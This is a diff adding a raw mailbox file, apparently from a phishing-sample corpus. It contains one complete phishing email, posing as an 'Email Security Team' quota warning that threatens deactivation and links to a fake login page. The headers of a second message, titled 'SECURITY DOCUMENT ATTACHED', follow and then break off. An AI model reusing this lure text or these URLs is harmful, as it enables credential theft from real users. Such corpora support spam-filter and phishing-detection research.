@@ -1,0 +1,77 @@
+X-SA-Exim-Mail-From: www-mm@r3b4.nsu.ru
+Subject: Your Mailbox Quota Almost Full (VERIFY TO AVOID DE-ACTIVATION)
+X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on mx1.nsu.ru
+X-Spam-Flag: YES
+X-Spam-Level: ********
+X-Spam-Status: Yes, score=8.5 required=5.0 tests=BAYES_50,DNS_FROM_AHBL_RHSBL,
+	FSL_HELO_NON_FQDN_1,HTML_IMAGE_ONLY_20,HTML_MESSAGE,MIME_HTML_ONLY,
+	MISSING_MIMEOLE,RDNS_NONE,T_HEADER_FROM_DIFFERENT_DOMAINS,URIBL_BLOCKED
+	autolearn=no autolearn_force=no version=3.4.0
+X-SA-Exim-Version: 4.2.1 (built Sun, 08 Jan 2012 02:45:44 +0000)
+X-SA-Exim-Scanned: Yes (on mx1.nsu.ru)
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 216
+
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+<p style="font-family: Arial, Tahoma, Verdana, sans-serif; font-size: 15px; background-color: rgb(255, 255, 255);"><img src="https://proxy.imgsmail.ru/?email=chughhki%40inbox.ru&e=1483160723&h=pV6Xn1QkFwbM5NAYyu-A4Q&url171=Y2k0Lmdvb2dsZXVzZXJjb250ZW50LmNvbS9wcm94eS9UMkIzNTMwTEY2VW5feExVUDh2TjI0RXpqSHBSek5VRG83QlQ0Y2wwVHBtX3VET3JtbFQ0Y3RXQ3hvbzNYck1iNjcwcm9NNEJ2ajFveTdSQVo2aVdtYmR5Wl9IQm5MOEdIQ2FPX3lQOXJidklYcHVWRUd6MmRRWU1ZcF9NNml2bmhFMkttb01RalpLVj1zMC1kLWUxLWZ0&is_https=1" style="border: 0px; font-family: arial, sans-serif; color: rgb(34, 34, 34); font-size: small;" /></p>
+
+<p style="background-color: rgb(255, 255, 255); font-family: arial, sans-serif; color: rgb(34, 34, 34); font-size: small;"> </p>
+
+<div style="background-color: rgb(255, 255, 255); font-family: arial, sans-serif; color: rgb(34, 34, 34); font-size: small;">
+<p>Automatically updating your [jose@monkey.org
+] against spam activity was not successful<br />
+If you do not verify your mailbox now, it will be blocked soon without further notice. <br />
+If you want to continue using your email account; </p>
+
+<p><a data-saferedirecturl="https://www.google.com/url?hl=en&q=http://w4w2.com/zyro/gallery/china/index.php?login%3D25&source=gmail&ust=1482967690514000&usg=AFQjCNHaLTHxLmmiLbIJLSif1f3kCn6b6g" data-snippet-id="584ebe9-7d00-e7b6-d759-9def76c999c9" href="http://www.maggianicostruzioni.it/galleria/9/base/index.php?login=jose@monkey.org
+" rel="noopener" style="color: rgb(17, 85, 204);" target="_blank">VERIFY & REACTIVATE [jose@monkey.org
+] </a></p>
+
+<p>Sincerely&#65292;<br />
+Email Security Team</p>
+</div>
+</body>
+</html>
+
+
+
+From jose@monkey.org Sun Jun 11 07:24:24 2017 +0000
+Return-Path: codewizard@cmn.org
+Delivered-To: jose@monkey.org
+X-FDA: 72938928048.19.car01_7db65c769c456
+X-Spam-Summary: 10,1,0,b520452e0b52b381,d41d8cd98f00b204,codewizard@cmn.org,:codewizard@cmn.org,RULES_HIT:41:355:379:962:967:988:989:1189:1260:1313:1314:1345:1381:1436:1516:1517:1518:1523:1536:1569:1575:1588:1592:1594:1711:1714:1730:1748:1764:1766:1782:1792:2393:2559:2562:3138:3139:3140:3141:3142:3876:3877:4699:5007:6114:6261:6642:6687:10004:11658:11914:12043:12196:12561:13439:14515:14721:14791:21080:21433:21554:21627:30026:30054:30055,0,RBL:68.230.241.144:@cmn.org:.lbl8.mailshell.net-62.4.0.100 66.201.201.201,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:ff,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0,LFtime:8,LUA_SUMMARY:none
+X-HE-Tag: car01_7db65c769c456
+X-Filterd-Recvd-Size: 59297
+Received: from fed1rmfepo102.cox.net (fed1rmfepo102.cox.net [68.230.241.144])
+	by imf30.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Sun, 11 Jun 2017 07:24:23 +0000 (UTC)
+Received: from fed1rmimpo109.cox.net ([68.230.241.158])
+          by fed1rmfepo102.cox.net
+          (InterMail vM.8.01.05.28 201-2260-151-171-20160122) with ESMTP
+          id <20170611072423.FIDB32620.fed1rmfepo102.cox.net@fed1rmimpo109.cox.net>
+          for <jose@monkey.org>; Sun, 11 Jun 2017 03:24:23 -0400
+Received: from SOMF-DC01.SOMF.INTERNAL ([70.176.37.239])
+	by fed1rmimpo109.cox.net with cox
+	id XKJL1v00C59b6pi01KQJC2; Sun, 11 Jun 2017 03:24:21 -0400
+X-CT-Class: Bulk
+X-CT-Score: 5.00
+X-CT-RefID: str=0001.0A090201.593CF026.0060,ss=3,re=0.000,recu=0.000,reip=0.000,vtr=str,vl=0,cl=3,cld=1,fgs=0
+X-CT-Spam: 0
+X-Authority-Analysis: v=2.1 cv=VKV9547X c=1 sm=1 tr=0 p=zVNHiRw4f5wA:10
+ p=W7QnN5jiD0etA8HFWtwA:9 a=uM3g/gs8L50Fpu4yuY5tjQ==:117
+ a=uM3g/gs8L50Fpu4yuY5tjQ==:17 a=L9H7d07YOLsA:10 a=9cW_t1CCXrUA:10
+ a=s5jvgZ67dGcA:10 a=fmD_JHji_u0A:10 a=KXl77lDgDEgIEtoqJYcA:9
+ a=xaQ34Qmgsrlp6UVKqTsA:9 a=wPNLvfGTeEIA:10 a=_W_S_7VecoQA:10
+ a=n3BslyFRqc0A:10 a=6FsJyJhzgm1vojBunZnC:22
+X-CM-Score: 100.00
+Authentication-Results: cox.net; none
+Content-Type: multipart/mixed; boundary="===============0222298420=="
+MIME-Version: 1.0
+Subject: SECURITY DOCUMENT ATTACHED
+To: Recipients <codewizard@cmn.org>
